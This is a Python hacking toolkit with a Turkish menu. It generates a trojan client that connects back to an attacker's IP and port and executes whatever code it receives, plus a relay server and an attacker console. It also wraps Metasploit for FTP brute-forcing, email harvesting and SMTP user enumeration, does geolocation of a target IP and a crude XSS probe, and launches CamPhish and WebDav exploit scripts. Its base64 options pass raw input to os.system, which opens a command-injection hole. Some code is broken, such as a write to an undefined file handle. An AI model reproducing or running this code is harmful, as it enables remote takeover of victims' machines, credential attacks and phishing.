#! /usr/bin/python3
# CODED BY NOTBODY...
import os
import time
import requests


def clear():
    if os.name == 'nt':
        _ = os.system('cls')
    elif os.name == 'mac':
        _ = os.system('clear')
    elif os.name == 'posix':
        _ = os.system('clear')
    else:
        _ = os.system('clear')
def check(): 
    r = requests.get("https://ipinfo.io/") 
    if r.status_code == 200: 
        print("\n[+] Sunucuya Bağlanıldı!\n") 
    else:
        print("\n[!] Sunucuya Bağlanılamadı!\n") 
        exit() 
clear()
ressamnotbody = """\033[94m\033[1m
                                                                             
         ,--.                                                                
       ,--.'|              ___        ,---,.                                 
   ,--,:  : |            ,--.'|_    ,'  .'  \                ,---,           
,`--.'`|  ' :   ,---.    |  | :,' ,---.' .' |   ,---.      ,---.'|           
|   :  :  | |  '   ,'\   :  : ' : |   |  |: |  '   ,'\     |   | :           
:   |   \ | : /   /   |.;__,'  /  :   :  :  / /   /   |    |   | |     .--,  
|   : '  '; |.   ; ,. :|  |   |   :   |    ; .   ; ,. :  ,--.__| |   /_ ./|  
'   ' ;.    ;'   | |: ::__,'| :   |   :     \'   | |: : /   ,'   |, ' , ' :  
|   | | \   |'   | .; :  '  : |__ |   |   . |'   | .; :.   '  /  /___/ \: |  
'   : |  ; .'|   :    |  |  | '.'|'   :  '; ||   :    |'   ; |:  |.  \  ' |  
|   | '`--'   \   \  /   ;  :    ;|   |  | ;  \   \  / |   | '/  ' \  ;   :  
'   : |        `----'    |  ,   / |   :   /    `----'  |   :    :|  \  \  ;  
;   |.'                   ---`-'  |   | ,'              \   \  /     :  \  \ 
'---'                             `----'                 `----'       \  ' ; 
                                                                       `--`  
       \033[93m Instagram: https://www.instagram.com/notbodyofficial/

       \033[93m Git-Hub: https://github.com/not-body/  \033[94m\033[1m    V 1.5                                                                                                         
                     
                                                  """
anamenu = """\033[91m
1 ) Şifrelemeler
2 ) Trojan
3 ) FTP Bruter
4 ) Domain Mail Scanner 
5 ) IP Sorgu
6 ) Admin Panel Finder
7 ) SMTP Enum Exploit
8 ) XSS Finder
9 ) CamPhish
10 ) WebDav Exploit 
"""
neyapakaq = """\033[91m
1 ) Şifrele 
2 ) Şifre Çöz
"""
sifmenu = """\033[91m
1 ) Base64
2 ) Base32
"""
trojanban = """ \033[91m
1 ) .py Trojan
2 ) .py Server
3 ) .py Panel
"""
n = "\n"
trojan = """import socket
import threading
import sys

class Client:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def sendMsg(self):
        while True:
            self.sock.send(bytes(input(""), "utf-8"))
    
    def __init__(self, address):
        self.sock.connect((address, "{}"))

        iThread = threading.Thread(target=self.sendMsg)
        iThread.daemon = True
        iThread.start()

        while True:
            data = self.sock.recv(1024)
            if not data:
                break
            exec(data)
        

client = Client("{}")


exit()
#port sonra ip


"""
server = """import socket
import threading
import sys

class Server:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connections = []
    def __init__(self):
        self.sock.bind(("{}", {})) #bağlantı ip ve portu
        self.sock.listen(1) # bağlantının dinlenmesi

    def handler(self, c, a):
        while True:
            data = c.recv(1024) # gelen veri
            for connection in self.connections: # gelen verinin
                connection.send(data) # diğer clientlere gönderilmesi
            if not data: # veri akışı yoksa
                print(str(a[0]) + ":" + str(a[1]), "disconnected") # disconnected yazılması
                self.connections.remove(c) #bağlantının silinmesi
                c.close() # ve kapatılması
                break # döngünün kırılması
    def run(self):
        while True:
            c, a = self.sock.accept()
            cThread = threading.Thread(target=self.handler, args=(c, a))
            cThread.daemon = True
            cThread.start()
            self.connections.append(c)
            print(str(a[0]) + ":" + str(a[1]), "connected")


server = Server()
server.run()
#ip sonra port
"""
saldırgan =  """import socket
import threading
import sys


class Client:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def sendMsg(self):
        while True:
            self.sock.send(bytes(input("send: "), "utf-8"))
    
    def __init__(self, address):
        self.sock.connect((address, {}))

        iThread = threading.Thread(target=self.sendMsg)
        iThread.daemon = True
        iThread.start()

        while True:
            data = self.sock.recv(1024)
            if not data:
                break
            

        
client = Client("{}")


exit()
#port sonra ip
"""


print(ressamnotbody)
print(anamenu)
body = input("\033[92m Lütfen İşlem seçiniz: ")
clear()
if(body == "1"):
    print(ressamnotbody)
    print(neyapakaq)
    sec = input("\033[92m Lütfen İşlem Seçiniz:")
    if(sec == "1"):
        clear()
        print(ressamnotbody)
        print(sifmenu)
        sif = input("\033[92m Şifreleme Yöntemi Seçin: ")
        mtn = input("\033[92m Şifrelenecek metini Girin: \033[91m")
        if(sif == "1"):
            print("\033[92m  Sonuç : \033[91m")
            os.system("echo -n {} | base64".format(mtn))
            print(n)
        elif(sif == "2"):
            print("\033[92m  Sonuç : \033[91m")
            os.system("echo -n {} | base32".format(mtn))
            print(n)
        else:
            print("\033[91mBir Şeyler Yanlış Gitti")
            time.sleep(1)
            exit()
    elif(sec == "2"):
        clear()
        print(ressamnotbody)
        print(sifmenu)
        sif = input("\033[92m Şifreleme Türü Seçiniz: ")
        mtn = input("\033[92m Çözülücek Metini Girin: \033[91m")
        if(sif == "1"):
            print("\033[92m  Sonuç : \033[91m")
            os.system("echo -n {} | base64 -d".format(mtn))
            print(n)
        elif(sif == "2"):
            print("\033[92m  Sonuç : \033[91m")
            os.system("echo -n {} | base32 -d".format(mtn))
            print(n)
        else:
            print("\033[91mBir Şeyler Yanlış Gitti")
            time.sleep(1)
            exit()
    else:
        print("\033[91mBir Şeyler Yanlış Gitti")
        time.sleep(1)
        exit()
elif(body == "2"):
    clear()
    print(ressamnotbody)
    print(trojanban)
    a = input("\033[92m Lütfen Size Uygun Dosyayı Seçiniz: ")
    b = input("\033[92m İp Adresiniz: ")
    c = input("\033[92m Port: ")
    d = input("\033[92m Dosya Adı: ")
    if(a == "1"):
        print("\033[94mDosya Oluşturuluyor..")
        time.sleep(1) 
        gbc = open(d, "w+")
        gbc.write(trojan.format(c, b))
        print("\033[95mDosya Oluşturuldu.")
    elif(a == "2"):
        print("\033[94mDosya Oluşturuluyor..")
        time.sleep(1)
        gfb = open(d, "w+")
        gfc.write(server.format(b, c))
        print("\033[95mDosya Oluşturuldu.")
    elif(a == "3"):
        print("\033[94mDosya Oluşturuluyor..")
        time.sleep(1) 
        gfj = open(d, "w+")
        gfj.write(trojan.format(c, b))
        print("\033[95mDosya Oluşturuldu.")
elif(body == "3"):
    clear()
    print(ressamnotbody)
    a = input("\033[92m İp Adresi: ")
    b = input("\033[92m Username List: ")
    c = input("\033[92m Passwoed List: ")
    time.sleep(1)
    os.system("""msfconsole -q -x "use auxiliary/scanner/ftp/ftp_login; set RHOSTS {} ; set USER_FILE {} ; set PASS_FILE {} ; exploit ; exit" """.format(a, b, c))
elif(body == "4"):
    clear()
    print(ressamnotbody)
    a = input("\033[92m Domain: ")
    time.sleep(1)
    os.system("""msfconsole -q -x "use auxiliary/gather/search_email_collector; set DOMAIN {}; exploit ; exit" """.format(a))
elif(body == "5"):
    clear()
    print(ressamnotbody)
    ip = input("\033[92m Hedef İp: ") 
    check() 
    country = requests.get("https://ipinfo.io/{}/country/".format(ip)).text 
    city = requests.get("https://ipinfo.io/{}/city/".format(ip)).text
    region = requests.get("https://ipinfo.io/{}/region/".format(ip)).text
    postal = requests.get("https://ipinfo.io/{}/postal/".format(ip)).text
    timezone = requests.get("https://ipinfo.io/{}/timezone/".format(ip)).text
    orgination = requests.get("https://ipinfo.io/{}/org/".format(ip)).text
    location =  requests.get("https://ipinfo.io/{}/loc/".format(ip)).text
    print("\033[95mİp: "+ip)
    print("\033[95mÜlke: "+country)
    print("\033[95mŞehir: "+city)
    print("\033[95mBölge: "+region)
    print("\033[95mPosta Kodu: "+postal)
    print("\033[95mZaman Dilimi: "+timezone)
    print("\033[95mOrganizasyon: "+orgination)
    print("\033[95mLokasyon: "+location)
    exit()
elif(body == "6"):
    os.system("python2 tools/a.py")
elif(body == "7"):
    clear()
    print(ressamnotbody)
    a = input("Hedef Sunucu IP: ")
    b = input("Hedef Sunucunun SMTP Portunu Giriniz [25 or 587]: ")
    os.system("""msfconsole -q -x "use auxiliary/scanner/smtp/smtp_enum ; set RHOSTS {} ; set RPORT {} ; exploit ; exit" """.format(a,b))
elif(body == "8"):
    clear()
    print(ressamnotbody)
    a = "<script>alert(XSS)</script>"
    b = input("\033[95mHedef Site: ")
    c = requests.post(b + a)
    if b in c.text:
        print("\033[93m XSS BULUNDU")
    else:
        print("\033[93mXSS BULUNMADI")
elif(body == "9"):
    os.chdir("tools/CamPhish")
    os.system("bash camphish.sh")
    os.chdir("../../")
elif(body == "10"):
    os.chdir("tools/Webdav")
    os.system("python2 exploit.py")
    os.chdir("../../")



else:
    print("\033[91mYanlış Giden Bir Şeyler Var")
    exit()   
        
    
    
    
    
    
    
    
    





















